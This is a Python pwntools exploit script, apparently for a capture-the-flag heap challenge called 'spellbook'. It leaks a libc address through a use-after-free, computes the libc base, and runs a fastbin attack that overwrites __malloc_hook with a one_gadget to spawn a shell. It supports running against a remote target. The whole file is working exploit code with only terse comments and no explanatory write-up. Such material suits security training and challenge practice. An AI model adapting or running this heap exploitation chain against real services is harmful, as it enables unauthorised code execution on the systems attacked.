from pwn import *
import os
os.system('clear')

exe = './spellbook'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def malloc(index, input_type, size: int, data: bytes):
    sh.sendlineafter(b'>> ', b'1')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b'power: ', str(size))
    sh.sendlineafter(b': ', data)

def show(index):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', f'{index}')

def edit(index, input_type, data: bytes):
    sh.sendlineafter(b'>> ', b'3')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b': ', data)

def free(index):
    sh.sendlineafter(b'>> ', b'4')
    sh.sendlineafter(b'entry: ', str(index))
    
def allc():
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', b'5')

sh = start()

## Leaking libc address
malloc(0, b'A' * 8, 0x200, b'A' * 8)
malloc(1, b'B' * 8, 24, b'B' * 8) # allocate another junk to prevent consolidation with the top chunk.

free(0)
show(0)

sh.recvuntil(b':')
sh.recvuntil(b':')

get = unpack(sh.recvline().strip().ljust(8, b'\x00'))
log.success(f'MAIN ARENA --> {hex(get)}')

## Calculating libc base.

libc.address = get - 0x3c4b78
log.success(f'LIBC BASE --> {hex(libc.address)}')

## Setup for fastbin attack

malloc(2, b'C' * 8, 0x68, b'C' * 8)
free(2)
free(1)

p = flat([
    libc.sym['__malloc_hook'] - 35
])

edit(2, b'D' * 8, p)
malloc(3, b'X' * 8, 0x68, b'X' * 8)
gadgets = (0x45226, 0x4527a, 0xf03a4, 0xf1247)[1]
one_gadget = libc.address + gadgets
log.success(f'ONE GADGET --> {hex(one_gadget)}') 

p = flat([
    cyclic(19),
    one_gadget
])

# malloc(4, b'Y' * 8, 0x68, cyclic(0x60)) # used to check for offset
malloc(4, b'Y' * 8, 0x68, p)

## __malloc_hook() already overwritten with one_gadget, every malloc usage shall drop a shell.
allc()

# gdb.attach(sh)

sh.interactive()
